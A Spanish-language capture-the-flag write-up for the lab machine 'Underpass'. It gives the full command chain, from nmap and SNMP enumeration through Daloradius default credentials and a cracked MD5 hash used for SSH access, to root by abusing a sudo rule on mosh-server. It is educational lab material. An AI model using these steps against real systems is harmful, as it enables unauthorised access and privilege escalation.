# Underpass - Writeup

## Información Inicial
- **IP objetivo:** 10.10.11.48
- **Servicios detectados:**  
  - HTTP (Daloradius web interface)  
  - SNMP (UDP 161)  
  - SSH (posterior acceso con credenciales)  

## Enumeración
Escaneo inicial con Nmap:  
```bash
nmap -p- --min-rate 4000 --open -sC -sV -sS -Pn 10.10.11.48 -oN nmap
```

Se identificó servicio SNMP abierto:  
```bash
nmap --top-ports 5000 --open -sU --min-rate 5000 10.10.11.48
```

Resultado:  
```
161/udp open  snmp
```

Con `snmpwalk` se obtuvo información sensible:  
```bash
snmpwalk -v 2c -c public 10.10.11.48 | tee snmp_data
```
Salida:  
```
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
```

## Explotación
Se detectó aplicación web Daloradius en:  
- `http://10.10.11.48/daloradius/app/operators/home-main.php`  
- `http://10.10.11.48/daloradius/app/users/login.php`  

Credenciales por defecto:  
```
administrator | radius
```

Además, en la base de usuarios apareció:  
```
svcMosh : 412DD4759978ACFCC81DEAB01B382403
```

Identificado como hash MD5 → crackeado con CrackStation:  
```
underwaterfriends
```

Acceso SSH:  
```bash
ssh svcMosh@10.10.11.48
Password: underwaterfriends
```

## Post-Explotación
Verificación de permisos SUID:  
```bash
find / -perm -4000 2>/dev/null
```

Chequeo de privilegios sudo:  
```bash
sudo -l
```
Salida:  
```
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

## Escalada de Privilegios
Se abusa del binario permitido `mosh-server`:  
```bash
sudo -u root /usr/bin/mosh-server
```

El comando devuelve clave de sesión:  
```
MOSH CONNECT 60001 QFXUwUd93kYksYrm7tjyiw
```

Explotación de variable de entorno:  
```bash
MOSH_KEY=QFXUwUd93kYksYrm7tjyiw mosh-client 127.0.0.1 60001
```

Esto permite ejecutar sesión como root.  

## Conclusión
La máquina Underpass presentaba:
1. **SNMP expuesto** con información sensible.  
2. **Credenciales por defecto** en Daloradius.  
3. **Hash MD5 crackeable** que permitió acceso SSH.  
4. **Abuso de sudo en mosh-server** para escalar a root.  

### Vector final:
SNMP → Daloradius → Credenciales → SSH → Sudo mosh-server → Root  

## Herramientas utilizadas
- Nmap
- Feroxbuster
- snmpwalk
- CrackStation
- SSH
- Sudo exploitation

---
**Rooted by: chepeto**
